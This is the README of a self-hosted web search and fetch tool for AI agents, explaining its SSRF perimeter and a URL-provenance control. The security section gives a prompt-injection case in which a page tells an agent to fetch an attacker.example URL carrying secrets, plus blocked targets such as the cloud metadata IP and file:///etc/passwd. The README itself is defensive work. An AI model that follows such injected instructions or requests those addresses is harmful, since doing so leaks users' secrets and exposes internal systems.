<div align="center">

<img src="assets/casanova-logo.png" alt="Casanova" width="200" />

# Casanova

**A self-hosted tool hub for AI agents — no third-party API keys.**

Casanova is a growing collection of agent tools you run on your own machine.
`web_search` and `web_fetch` replace hosted agent web tools — search against
your own [SearXNG](https://github.com/searxng/searxng), fetch through a
hardened perimeter you control. [`transcriptanova/`](transcriptanova/) adds
free open-source speech-to-text via Whisper. Same principle every time:
self-hosted, key-free, and built to be inspected.

[![License](https://img.shields.io/badge/license-Apache%202.0-blue.svg)](LICENSE)
[![Python](https://img.shields.io/badge/python-3.11%2B-blue.svg)](https://www.python.org/)
[![Tests](https://img.shields.io/badge/tests-177%20passing-brightgreen.svg)](#testing)
[![MCP](https://img.shields.io/badge/MCP-compatible-8A2BE2.svg)](https://modelcontextprotocol.io/)

</div>

---

## Tools

| Tool | Status | What it does |
|---|---|---|
| **`web_search`** | ✅ shipped | Ranked search results via your own SearXNG — titles, URLs, snippets |
| **`web_fetch`** | ✅ shipped | Fetch one URL as clean markdown, through an SSRF-hardened perimeter |
| **`transcribe`** | 🚧 scaffold | Free open-source Whisper STT — [`transcriptanova/`](transcriptanova/) |
| _more_ | 🚧 planned | The hub is designed to grow — additional agent tools land here over time |

---

## Why

Agent web tools are usually a hosted black box. This is the same two tools —
same shapes, same parameters — running entirely on your own machine.

The interesting part isn't the HTTP client. It's that **a fetch tool is an
egress primitive pointed at attacker-chosen URLs**, and most implementations get
that wrong in two directions at once:

|  | Attack | Defence here |
|---|---|---|
| **Inbound** | `http://169.254.169.254/` reaches your cloud metadata service | Resolve-then-pin, every redirect re-validated |
| **Outbound** | An injected page tells the model to fetch `https://evil/?data=<secrets>` | URL provenance — unseen URLs are refused |

Both are implemented, both are tested, and the tests are the majority of this
codebase.

---

## Quick start

```bash
git clone https://github.com/lucasdmarshall/Casanova.git
cd Casanova
```

```bash
openssl rand -hex 32   # paste into searxng/settings.yml as server.secret_key
```

```bash
docker compose up -d --build
```

```bash
curl localhost:8000/health
```

**Search** — ranked results with titles, URLs and snippets:

```bash
curl -X POST localhost:8000/web_search -H 'content-type: application/json' -d '{"query":"rust ownership borrow checker","max_results":5,"session_id":"conv-1"}'
```

**Fetch** — the page's main content as clean markdown:

```bash
curl -X POST localhost:8000/web_fetch -H 'content-type: application/json' -d '{"url":"https://example.com/","session_id":"conv-1"}'
```

As an MCP server over stdio:

```bash
python -m web_tools.mcp_server
```

---

## Architecture

```
       ┌──────────────┐        ┌──────────────┐
       │ HTTP service │        │  MCP server  │      two transports,
       │  (FastAPI)   │        │   (stdio)    │      one behaviour
       └───────┬──────┘        └──────┬───────┘
               └───────────┬──────────┘
                     ┌─────▼──────┐
                     │  Toolset   │  cache · provenance · robots · schemas
                     └─────┬──────┘
             ┌─────────────┴─────────────┐
    ┌────────▼────────┐         ┌────────▼─────────┐
    │   web_search    │         │    web_fetch     │
    │ SearXNG adapter │         │  guard → stream  │
    │  (swappable)    │         │  → extract → md  │
    └────────┬────────┘         └──────────────────┘
             │
    ┌────────▼────────┐
    │    SearXNG      │  private network, no published ports
    └─────────────────┘
```

| Module | Role |
|---|---|
| [`guard.py`](src/web_tools/guard.py) | SSRF perimeter — scheme/port allowlist, resolve-then-pin |
| [`fetch.py`](src/web_tools/fetch.py) | Streaming fetch, manual redirect loop, byte caps |
| [`extract.py`](src/web_tools/extract.py) | trafilatura → markdown, PDF text, invisible-char stripping |
| [`provenance.py`](src/web_tools/provenance.py) | URL provenance — exfiltration control |
| [`robots.py`](src/web_tools/robots.py) | robots.txt, fetched through the guard |
| [`search.py`](src/web_tools/search.py) | SearXNG adapter behind a swappable protocol |
| [`budget.py`](src/web_tools/budget.py) | Per-session call caps — the `max_uses` equivalent |
| [`cache.py`](src/web_tools/cache.py) | SQLite TTL cache, keyed on normalized queries |
| [`tools.py`](src/web_tools/tools.py) | Shared layer both front ends call |

---

## Security

### Inbound — the SSRF perimeter

Two properties carry the weight:

**Resolve-then-pin.** The hostname is resolved once, *every* returned address is
checked, and the connection is made to the exact IP that passed — carrying the
original hostname in `Host` and SNI so certificates still verify. Validating a
name and then letting the HTTP client resolve it again is a DNS-rebinding hole.

**Every redirect hop is re-validated.** Redirects are followed manually,
precisely so a `302` to `169.254.169.254` cannot slip past the first check.

Also enforced: `http`/`https` only, a port allowlist, byte caps applied to
*decoded* bytes so a gzip bomb aborts mid-stream, and stripping of zero-width
and bidi characters used to hide injected instructions from human review.

```
http://169.254.169.254/latest/meta-data/   blocked: not globally routable
http://127.0.0.1:80/                       blocked: not globally routable
http://localhost/                          blocked: ::1 is not globally routable
file:///etc/passwd                         blocked: scheme 'file' is not allowed
https://user:pass@example.com/             blocked: credentials in URL
```

### Outbound — URL provenance

The guard stops the fetcher reaching *your* network. It does nothing about the
other direction: an injected page telling the model to fetch
`https://attacker.example/?data=<secrets>`. That address is ordinary and public,
so every guard check passes and the secrets leave in the query string.

So a URL is fetchable only if something trusted put it there first:

| Source | Trusted? |
|---|---|
| A `web_search` result | yes |
| An earlier fetch's post-redirect URL | yes |
| Explicit client registration | yes |
| **A link found inside a fetched page body** | **never** |

That last row is the point — it is exactly the channel an injected page would
use.

```bash
curl -X POST localhost:8000/context/urls -H 'content-type: application/json' -d '{"session_id":"conv-1","urls":["https://example.com/page"]}'
```

`/context/urls` is the trust boundary. Expose it to the component that owns the
conversation — never to the model. Anything that can call it can authorize its
own fetches.

`WT_FETCH_URL_POLICY` is `strict` (refuse), `warn` (allow and flag), or `off`.

> **Known limitation — MCP.** An MCP server sees tool calls, not the
> conversation, so it can enforce "came from a search or an earlier fetch" but
> cannot know the user pasted a link. Under `strict` that link is refused. A
> `user_provided` argument would *not* fix this: the **model** sets tool
> arguments, and a model that can vouch for its own URLs is not restricted at
> all. Use the HTTP service with `/context/urls`, or run MCP with
> `WT_FETCH_URL_POLICY=warn`.

### Content handling

Fetched text is returned inside `<untrusted_content>` delimiters with an explicit
notice. It is data, never instructions.

### Deployment

**Do not publish the service port without auth in front of it.** The guard stops
requests reaching your internal network, but an open instance is still a free
egress proxy for whoever finds it. The compose file binds to loopback and
publishes no ports for SearXNG at all.

---

## robots.txt

Honoured by default, with two deliberate deviations from the obvious
implementation:

**`RobotFileParser.read()` is never called.** It fetches the URL itself with
`urllib.request.urlopen`, bypassing the SSRF perimeter completely — a hostile
redirect on a robots.txt fetch would reach straight into your network. The file
is fetched through the guard and only the text is handed to the parser.

**Unreachable robots means allowed.** RFC 9309 permits treating a `5xx` as
"disallow everything", which is right for a bulk crawler running unattended.
This tool fetches one page because someone asked it to, so a flaky robots.txt
returning `503` should not silently make a site unreadable.

One fetch per host per day. Set `WT_RESPECT_ROBOTS=false` to skip it entirely.

---

## Engine selection — measure it, don't guess

```bash
docker compose exec -T web-tools python -m web_tools.engine_check
```

This matters more than it sounds, because **every failure mode here is silent**:

| Trap | What it looks like |
|---|---|
| Unknown engine name | SearXNG falls back to its defaults, so a typo looks like a working engine. The name is `google cse`, with a space — plain `google` does not exist |
| Rate-limited but still answering | Bing returned pages about *server* for `server-side request forgery`, and outranked good results once merged. Worse than a block, because nothing errors |
| `engines` + `categories` together | They are **additive**, not intersecting — sending both queries the whole category and defeats the allowlist |
| Encyclopaedic engines | Wikipedia returns content only in `infoboxes`, never `results`. A parser reading `results` alone drops it and it looks blocked |

The checker catches all four: it validates names against `/config`, tests
relevance rather than counting rows, and probes with mixed query shapes.

**Most engines are disabled by default.** One instance had 61 general-category
engines with 11 enabled; probing the other 50 found **24 working** — including
`duckduckgo web`, which succeeds where plain `duckduckgo` is CAPTCHA'd
(different implementation, different endpoint), plus independent indexes like
`mwmbl`, `yandex` and `seznam`. Naming a disabled engine in `WT_SEARCH_ENGINES`
activates it; you do not need to edit `settings.yml`.

Merging was measured, not assumed:

| Set | Results | Latency | Top-3 relevant |
|---|---|---|---|
| `google cse` only | 20 | 346 ms | 3/3 |
| **Default (5 engines)** | **65** | **988 ms** | **3/3** |
| 12 engines | 91 | 1940 ms | 3/3 |
| **No Google at all** | 62 | 1083 ms | **3/3** |

That last row is the goal: search survives losing any single engine.

Caching is not an optimisation here — it is what keeps a self-hosted instance
under the rate limits. Agent loops re-issue near-identical queries constantly,
and every cache hit is one less scrape against an engine deciding whether to
block you.

---

## Keeping tool use cheap

The usual advice is a `shouldSearch(query)` gate — classify the query, skip the
search if it looks unnecessary. **This project deliberately does not do that**,
for three reasons:

- **The decision belongs to the model.** A tool server sees a query string; the
  model sees the whole conversation. Putting the choice in the tool moves it to
  whoever has *less* information.
- **The economics invert.** A SearXNG query here is free and takes ~1s. An LLM
  classifier costs an API call and ~1s. You would be paying money to avoid a
  free operation — advice written for paid search APIs, misapplied.
- **The failure is asymmetric.** An unnecessary search wastes a second. A
  *skipped* search produces a confident answer from stale memory, which is the
  worst thing an agent can do.

What is here instead is structural, not semantic — it counts and reorders, and
never tries to understand what a query means:

| Lever | What it does |
|---|---|
| **Prescriptive tool descriptions** | Says *when* to call, not just what it does. Zero runtime cost, and the main thing that actually shapes triggering |
| **`max_uses` budgets** | Per-session caps on searches and fetches. Bounds runaway loops. Cached searches don't count — they cost nothing externally |
| **Query normalization** | `"Bitcoin Price?"` and `" bitcoin  price "` share one cache entry instead of three |
| **Relevance ranking** | Results that share no content words with the query sink to the bottom |

The ranking answers a real failure that is worse than searching too often:
*searched, then trusted garbage*. A rate-limited engine keeps answering — Bing
returned pages about **servers** for `server-side request forgery`, and those
outranked good results once merged. Nothing errors.

It **demotes rather than drops**, because a floor cannot tell "irrelevant" from
"relevant but phrased differently" — an *SSRF explained* page scores zero on
`server-side request forgery` and is still the right answer. Scores are exposed
on every result, and `WT_RELEVANCE_FLOOR` defaults to `0` (reorder only).

---

## API

| Endpoint | Purpose |
|---|---|
| `POST /web_search` | Search. `query`, `max_results`, `allowed_domains`, `blocked_domains`, `session_id` |
| `POST /web_fetch` | Fetch one URL. `url`, `max_chars`, `session_id` |
| `POST /context/urls` | Vouch for URLs. `session_id`, `urls` |
| `GET /schemas` | Tool definitions, ready for an LLM `tools` array |
| `GET /health` | Liveness |

Errors come back in the response body, not as HTTP status codes — the caller is
an agent loop, and "this URL was blocked" is a result to reason about, not a
transport failure. Every response carries the same keys whether it succeeded or
failed.

---

## Configuration

All via environment variable.

| Variable | Default | Notes |
|---|---|---|
| `WT_SEARXNG_URL` | `http://searxng:8080` | Service name on the compose network |
| `WT_SEARCH_ENGINES` | `google cse,duckduckgo web,yandex,mwmbl,wikipedia` | Host-dependent — measure it |
| `WT_FETCH_URL_POLICY` | `strict` | `strict` / `warn` / `off` |
| `WT_MAX_SEARCHES_PER_SESSION` | `0` | `max_uses` for search; 0 = unlimited |
| `WT_MAX_FETCHES_PER_SESSION` | `0` | `max_uses` for fetch; 0 = unlimited |
| `WT_RELEVANCE_FLOOR` | `0.0` | Drop results below this score; 0 = reorder only |
| `WT_RESPECT_ROBOTS` | `true` | |
| `WT_ROBOTS_TTL` | `86400` | One robots.txt per host per day |
| `WT_MAX_BYTES` | `5242880` | Cap on decoded response body |
| `WT_MAX_CHARS` | `50000` | Cap on extracted text |
| `WT_CACHE_SEARCH_TTL` | `3600` | Seconds |
| `WT_CACHE_FETCH_TTL` | `86400` | Seconds |
| `WT_PORT` | `8000` | Published port (loopback only) |
| `WT_ALLOW_PRIVATE_IPS` | `false` | **Disables the SSRF perimeter.** Tests only |

---

## Testing

```bash
pytest -q
```

**177 tests.** The bulk cover `guard.py` and `provenance.py` — one case per real
technique: metadata IPs, CGNAT, v4-mapped IPv6, 6to4, split-horizon DNS answers,
credential-stuffed URLs, non-web ports, cross-session URL leakage,
query-string exfiltration, cache-ordering bypasses, and budget accounting.

Before deploying onto a host with live workloads:

```bash
bash scripts/preflight.sh
```

That script is strictly read-only — it surveys running containers, port
conflicts, egress and outbound IP, and changes nothing.

---

## License

Apache License 2.0 — see [LICENSE](LICENSE) and [NOTICE](NOTICE).

Copyright 2026 Lucas D Marshall (Kaung Myat San).
